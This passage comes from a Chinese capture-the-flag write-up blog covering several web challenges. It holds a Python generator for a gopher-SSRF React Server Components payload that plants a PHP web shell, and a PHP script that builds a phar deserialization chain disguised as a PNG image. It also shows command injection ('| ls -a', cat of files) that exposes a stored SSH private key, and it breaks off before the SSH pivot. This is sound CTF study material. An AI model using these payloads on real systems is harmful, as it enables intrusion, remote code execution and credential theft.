urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_exploit</span>():</span><br><span class="line">    js_code = <span class="string">&#x27;let r=arguments[0]; import(&quot;fs&quot;).then(f=&gt;&#123;f.writeFileSync(&quot;/var/www/html/a.php&quot;, &quot;&lt;?php system($_GET[\\&quot;a\\&quot;]); ?&gt;&quot;); r();&#125;).catch(arguments[1]); //&#x27;</span></span><br><span class="line">    </span><br><span class="line">    chunk_0 = &#123;</span><br><span class="line">        <span class="string">&quot;then&quot;</span>: <span class="string">&quot;$1:__proto__:then&quot;</span>,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="string">&quot;resolved_model&quot;</span>,</span><br><span class="line">        <span class="string">&quot;reason&quot;</span>: -<span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&#x27;&#123;&quot;then&quot;:&quot;$B1337&quot;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;_response&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;_prefix&quot;</span>: js_code,</span><br><span class="line">            <span class="string">&quot;_formData&quot;</span>: &#123; <span class="string">&quot;get&quot;</span>: <span class="string">&quot;$1:constructor:constructor&quot;</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    boundary = <span class="string">&quot;----WebKitFormBoundaryCTFExploit&quot;</span></span><br><span class="line">    body = (</span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Disposition: form-data; name=&quot;0&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;json.dumps(chunk_0, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>))&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Disposition: form-data; name=&quot;1&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;&quot;$@0&quot;\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>--\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    http_request = (</span><br><span class="line">        <span class="string">f&quot;POST / HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Host: 127.0.0.1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Next-Action: ctf_exploit\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Accept: text/x-component\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Type: multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body.encode(<span class="string">&#x27;utf-8&#x27;</span>))&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Connection: close\r\n\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;gopher://127.0.0.1:80/_<span class="subst">&#123;urllib.parse.quote(http_request)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(generate_exploit())</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0ANext-Action%3A%20ctf_exploit%0D%0AAccept%3A%20text/x-component%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D----WebKitFormBoundaryCTFExploit%0D%0AContent-Length%3A%20537%0D%0AConnection%3A%20close%0D%0A%0D%0A------WebKitFormBoundaryCTFExploit%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%220%22%0D%0A%0D%0A%7B%22then%22%3A%22%241%3A__proto__%3Athen%22%2C%22status%22%3A%22resolved_model%22%2C%22reason%22%3A-1%2C%22value%22%3A%22%7B%5C%22then%5C%22%3A%5C%22%24B1337%5C%22%7D%22%2C%22_response%22%3A%7B%22_prefix%22%3A%22let%20r%3Darguments%5B0%5D%3B%20import%28%5C%22fs%5C%22%29.then%28f%3D%3E%7Bf.writeFileSync%28%5C%22/var/www/html/a.php%5C%22%2C%20%5C%22%3C%3Fphp%20system%28%24_GET%5B%5C%5C%5C%22a%5C%5C%5C%22%5D%29%3B%20%3F%3E%5C%22%29%3B%20r%28%29%3B%7D%29.catch%28arguments%5B1%5D%29%3B%20//%22%2C%22_formData%22%3A%7B%22get%22%3A%22%241%3Aconstructor%3Aconstructor%22%7D%7D%7D%0D%0A------WebKitFormBoundaryCTFExploit%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%221%22%0D%0A%0D%0A%22%24%400%22%0D%0A------WebKitFormBoundaryCTFExploit--%0D%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送之后a.php木马已经写入</p>
+<p><img src="C:\Users\15292\Desktop\ctf\联想截图_20260419102152.png" alt="联想截图_20260419102152"></p>
+<p>访问网页后的&#x2F;a.php并写入指令cat &#x2F;flag得到flag</p>
+<p><img src="C:\Users\15292\Desktop\ctf\联想截图_20260419102015.png" alt="联想截图_20260419102015"></p>
+<h2 id="世界上最好的大象"><a href="#世界上最好的大象" class="headerlink" title="世界上最好的大象"></a>世界上最好的大象</h2><p>首先看上传图片的限制</p>
+<ol>
+<li><p><strong>后缀校验</strong>：必须是 <code>.png</code> 等图片后缀。</p>
+</li>
+<li><p>**头校验 **：文件前 8 字节必须包含 <code>\x89PNG</code>。</p>
+</li>
+<li><p><strong>尾校验 <strong>：文件</strong>最后 32 个字节</strong>内必须包含 PNG 的结束符 <code>IEND\xAE\x42\x60\x82</code>。</p>
+</li>
+</ol>
+<p>这个好说</p>
+<p>再看看class.php里面的函数调用链</p>
+<p> <code>__destruct</code>：<code>Visitor</code> 类在脚本结束销毁时，会 <code>echo $this-&gt;bio;</code>，把属性当成字符串处理</p>
+<p>然后 <code>__toString</code>：触发 <code>ShowCard</code> 类的 <code>__toString</code>，内部执行 <code>$resolver();</code>，把对象当成函数调用</p>
+<p> <code>__invoke</code>：触发 <code>LabelResolver</code> 类的 <code>__invoke</code>，内部执行 <code>return $this-&gt;entry-&gt;{$this-&gt;field};</code>，访问对象不存在的属性</p>
+<p>(<code>__get</code>)：触发 <code>CacheEntry</code> 类的 <code>__get</code>，内部执行 <code>$this-&gt;driver-&gt;{$this-&gt;method}();</code>，调用对象不存在的方法</p>
+<p>(<code>__call</code> -&gt; <code>eval</code>)：触发 <code>TemplateEngine</code> 类的 <code>__call</code>，最终执行 <code>eval($this-&gt;shell);</code></p>
+<p>最后<code>eval()</code>还有过滤所有数字和字母，这个可以直接用通配符读出所有文件就可以类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?= `/???/??? /????`;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在本地服务器上写一个生成木马图片的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 还原漏洞环境中的类结构</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Visitor</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$bio</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowCard</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$source</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LabelResolver</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$entry</span>; <span class="keyword">public</span> <span class="variable">$field</span> = <span class="string">&#x27;label&#x27;</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheEntry</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$driver</span>; <span class="keyword">public</span> <span class="variable">$cacheKey</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">public</span> <span class="variable">$method</span> = <span class="string">&#x27;render&#x27;</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateEngine</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$shell</span> = <span class="string">&#x27;&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构造无字母数字的系统命令盲读 Payload</span></span><br><span class="line"><span class="comment">// 对应执行：/bin/cat /init /flag /sbin /boot ...</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?= `/???/??? /????`;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 按照逆向推导顺序组装 POP 链</span></span><br><span class="line"><span class="variable">$engine</span> = <span class="keyword">new</span> <span class="title class_">TemplateEngine</span>();</span><br><span class="line"><span class="variable">$engine</span>-&gt;shell = <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">CacheEntry</span>();</span><br><span class="line"><span class="variable">$cache</span>-&gt;driver = <span class="variable">$engine</span>;</span><br><span class="line"><span class="variable">$cache</span>-&gt;method = <span class="string">&quot;any_method_not_exists&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$label</span> = <span class="keyword">new</span> <span class="title class_">LabelResolver</span>();</span><br><span class="line"><span class="variable">$label</span>-&gt;entry = <span class="variable">$cache</span>;</span><br><span class="line"><span class="variable">$label</span>-&gt;field = <span class="string">&quot;any_property&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$card</span> = <span class="keyword">new</span> <span class="title class_">ShowCard</span>();</span><br><span class="line"><span class="variable">$card</span>-&gt;source = <span class="variable">$label</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$visitor</span> = <span class="keyword">new</span> <span class="title class_">Visitor</span>();</span><br><span class="line"><span class="variable">$visitor</span>-&gt;bio = <span class="variable">$card</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 生成符合 PNG 规范的无损 Phar 文件</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;payload.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;payload.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [魔数绕过] 设置头部为 PNG 特征</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;\x89PNG\r\n\x1a\n&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$visitor</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// [尾部绕过] 将 IEND 藏入文件实体内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;IEND\xAE\x42\x60\x82&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// [签名修复] 强制改为 MD5 签名，使 IEND 精准落入倒数 32 字节检测窗口</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setSignatureAlgorithm</span>(<span class="title class_">Phar</span>::<span class="variable constant_">MD5</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. [后缀绕过] 伪装成 png 文件</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;payload.phar&quot;</span>, <span class="string">&quot;payload.png&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Payload 生成成功：payload.png\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后上传通过phar协议读取文件图片马，会发现果然后台返回了一堆乱码，读到了一些二进制文件，里面同时也有flag</p>
+<p><img src="C:\Users\15292\Desktop\ctf\联想截图_20260419140340.png" alt="联想截图_20260419140340"></p>
+<p>啃臭加U查看源码翻到末尾发现flag</p>
+<p><img src="C:\Users\15292\Desktop\ctf\联想截图_20260419135754.png" alt="联想截图_20260419135754"></p>
+<h2 id="It’s-myrOOt"><a href="#It’s-myrOOt" class="headerlink" title="It’s myrOOt!!!!"></a>It’s myrOOt!!!!</h2><p>首先在execute 尝试 <code>| ls -a</code> 没想到直接执行了<br>得到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">config</span><br><span class="line">dev</span><br><span class="line">entrypoint.sh</span><br><span class="line">etc</span><br><span class="line">frontend</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>发现启动脚本entrypoint.sh打开看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line">FLAG_PATH=<span class="string">&quot;/root/flag.txt&quot;</span></span><br><span class="line">MYSQL_SOCKET=<span class="string">&quot;/run/mysqld/mysqld.sock&quot;</span></span><br><span class="line">MYSQL_DATABASE=<span class="string">&quot;$&#123;MYSQL_DATABASE:-blog&#125;&quot;</span></span><br><span class="line">MYSQL_USER=<span class="string">&quot;$&#123;MYSQL_USER:-web_user&#125;&quot;</span></span><br><span class="line">MYSQL_PASSWORD=<span class="string">&quot;$&#123;MYSQL_PASSWORD:-web_pass&#125;&quot;</span></span><br><span class="line">JUMP_KEY_PATH=<span class="string">&quot;/opt/pentest/runtime/jumpuser_ed25519&quot;</span></span><br><span class="line">JUMP_NOTE_PATH=<span class="string">&quot;/home/jumpuser/note.txt&quot;</span></span><br><span class="line"></span><br><span class="line">write_flag() &#123;</span><br><span class="line">    local flag_value</span><br><span class="line"></span><br><span class="line">    flag_value=<span class="string">&quot;$&#123;GZCTF_FLAG:-flag&#123;demo_dynamic_flag&#125;&#125;&quot;</span></span><br><span class="line">    printf <span class="string">&#x27;%s\n&#x27;</span> <span class="string">&quot;$flag_value&quot;</span> &gt; <span class="string">&quot;$FLAG_PATH&quot;</span></span><br><span class="line">    chown root:root <span class="string">&quot;$FLAG_PATH&quot;</span></span><br><span class="line">    chmod 0600 <span class="string">&quot;$FLAG_PATH&quot;</span></span><br><span class="line">    unset GZCTF_FLAG || true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ensure_jump_material() &#123;</span><br><span class="line">    local passphrase</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;$JUMP_KEY_PATH&quot;</span> ]; then</span><br><span class="line">        passphrase=<span class="string">&quot;$(pwgen -s 18 1)&quot;</span></span><br><span class="line">        ssh-keygen -q -t ed25519 -N <span class="string">&quot;$passphrase&quot;</span> -C <span class="string">&quot;jumpuser@jumpbox&quot;</span> -f <span class="string">&quot;$JUMP_KEY_PATH&quot;</span></span><br><span class="line">        printf <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;$passphrase&quot;</span> &gt; /opt/pentest/runtime/jumpuser_passphrase</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    install -d -m 0700 -o jumpuser -g jumpuser /home/jumpuser/.ssh</span><br><span class="line">    install -m 0600 -o jumpuser -g jumpuser <span class="string">&quot;$JUMP_KEY_PATH.pub&quot;</span> /home/jumpuser/.ssh/authorized_keys</span><br><span class="line">    install -m 0644 -o jumpuser -g jumpuser /opt/pentest/note.txt <span class="string">&quot;$JUMP_NOTE_PATH&quot;</span></span><br><span class="line">    passwd -d jumpuser &gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> || true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_mysql_data_dir() &#123;</span><br><span class="line">    <span class="keyword">if</span> [ ! -d /var/lib/mysql/mysql ]; then</span><br><span class="line">        mariadb-install-db --user=mysql --datadir=/var/lib/mysql &gt;/tmp/mysql-install.log <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start_mysql() &#123;</span><br><span class="line">    gosu mysql mariadbd \</span><br><span class="line">        --bind-address=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> \</span><br><span class="line">        --socket=<span class="string">&quot;$MYSQL_SOCKET&quot;</span> \</span><br><span class="line">        --datadir=/var/lib/mysql \</span><br><span class="line">        --pid-file=/run/mysqld/mysqld.pid \</span><br><span class="line">        &gt;/tmp/mariadb.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ! mysqladmin --socket=<span class="string">&quot;$MYSQL_SOCKET&quot;</span> ping &gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span>; do</span><br><span class="line">        sleep <span class="number">1</span></span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">seed_mysql() &#123;</span><br><span class="line">    local escaped_key</span><br><span class="line">    local passphrase</span><br><span class="line">    local note</span><br><span class="line"></span><br><span class="line">    passphrase=<span class="string">&quot;$(cat /opt/pentest/runtime/jumpuser_passphrase)&quot;</span></span><br><span class="line">    escaped_key=<span class="string">&quot;$(sed &#x27;:a;N;$!ba;s/\n/\\n/g&#x27; &quot;</span>$JUMP_KEY_PATH<span class="string">&quot;)&quot;</span></span><br><span class="line">    note=<span class="string">&quot;old backup note: key passphrase: $&#123;passphrase&#125;; local ssh port moved to 2222&quot;</span></span><br><span class="line"></span><br><span class="line">    sed \</span><br><span class="line">        -e <span class="string">&quot;s|__MYSQL_DATABASE__|$&#123;MYSQL_DATABASE&#125;|g&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s|__MYSQL_USER__|$&#123;MYSQL_USER&#125;|g&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s|__MYSQL_PASSWORD__|$&#123;MYSQL_PASSWORD&#125;|g&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s|__PRIVATE_KEY__|$&#123;escaped_key&#125;|g&quot;</span> \</span><br><span class="line">        -e <span class="string">&quot;s|__KEY_NOTE__|$&#123;note&#125;|g&quot;</span> \</span><br><span class="line">        /opt/pentest/mysql/schema.sql.template &gt; /opt/pentest/runtime/schema.sql</span><br><span class="line">		//发现秘钥保存路径</span><br><span class="line"></span><br><span class="line">    mysql --socket=<span class="string">&quot;$MYSQL_SOCKET&quot;</span> &lt; /opt/pentest/runtime/schema.sql</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start_sshd() &#123;</span><br><span class="line">    ssh-keygen -A &gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> || true</span><br><span class="line">    /usr/sbin/sshd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">prepare_runtime() &#123;</span><br><span class="line">    chmod <span class="number">1777</span> /tmp</span><br><span class="line">    install -d -m 0755 -o root -g root /opt/pentest/runtime</span><br><span class="line">    <span class="keyword">if</span> [ ! -f /opt/pentest/maintenance/README.md ]; then</span><br><span class="line">        printf <span class="string">&#x27;root maintenance only\n&#x27;</span> &gt; /opt/pentest/maintenance/README.md</span><br><span class="line">        chown root:root /opt/pentest/maintenance/README.md</span><br><span class="line">        chmod 0644 /opt/pentest/maintenance/README.md</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start_olivetin() &#123;</span><br><span class="line">    <span class="built_in">exec</span> gosu olivetin /usr/<span class="built_in">bin</span>/OliveTin</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write_flag</span><br><span class="line">prepare_runtime</span><br><span class="line">ensure_jump_material</span><br><span class="line">init_mysql_data_dir</span><br><span class="line">start_mysql</span><br><span class="line">seed_mysql</span><br><span class="line">start_sshd</span><br><span class="line">start_olivetin</span><br></pre></td></tr></table></figure>
+
+<p>flag在root里面肯定看不了,local ssh port moved to 2222 且端口转移到2222</p>
+<p>然后分析脚本使用 <code>pwgen</code> 生成了一个随机密码，并用它创建了一对 SSH 密钥 (<code>jumpuser_ed25519</code>)</p>
+<p>这个公钥被放到了 <code>jumpuser</code> 的 <code>.ssh/authorized_keys</code> 中，这意味着如果我们拿到私钥，就可以 SSH 登录到这个账户</p>
+<p>接下来就读取啊数据库中的私钥密码<code>| cat /opt/pentest/mysql/schema.sql </code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS blog;</span><br><span class="line">CREATE USER IF NOT EXISTS &#x27;web_user&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;web_pass&#x27;;</span><br><span class="line">CREATE USER IF NOT EXISTS &#x27;web_user&#x27;@&#x27;127.0.0.1&#x27; IDENTIFIED BY &#x27;web_pass&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON blog.* TO &#x27;web_user&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON blog.* TO &#x27;web_user&#x27;@&#x27;127.0.0.1&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">USE blog;</span><br><span class="line"></span><br><span class="line">CREATE TABLE IF NOT EXISTS ssh_keys (</span><br><span class="line">    id INT PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">    owner VARCHAR(50) NOT NULL,</span><br><span class="line">    private_key TEXT NOT NULL,</span><br><span class="line">    note VARCHAR(255) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">DELETE FROM ssh_keys WHERE owner = &#x27;jumpuser&#x27;;</span><br><span class="line">INSERT INTO ssh_keys (owner, private_key, note) VALUES</span><br><span class="line">(&#x27;jumpuser&#x27;, &#x27;-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD5key0IV</span><br><span class="line">7XKe8Zj1oQ7fYIAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIAWFA86ISeT73va4</span><br><span class="line">WikXfLUHdkx+LvqX5CiU3tbUvXM5AAAAoL/wL70uLKySUSvwilFtWPqNIL8vPs0w7am5wU</span><br><span class="line">6npg/wN7bis/qu4gEsvEWEcsGPKvaP3vSb5+ZunPKfxDBeN9Mq+C47NSgVi2d4EPEq/R4J</span><br><span class="line">SOPa6JJf6PjkxaJthL3wUc+9kHylSBnBv4FSFjxBQn1ELt47IqPanHJ5UxA/qU+G+Nwg3P</span><br><span class="line">QBsSejsvtc5b1JQ2Gj35zWhCzHwmz8mxXYSEM=</span><br><span class="line">--</span><br></pre></td></tr></table></figure>
+
+<p>因为这个页面是只有输出的没有交互，直接执行 ssh 会因为无法手动输入私钥密码而失败，可以在本地创建一个自动输入的脚本，端口也改为2222<br>payload如下：把密钥密码写入并且执行身份跳转指令</p>
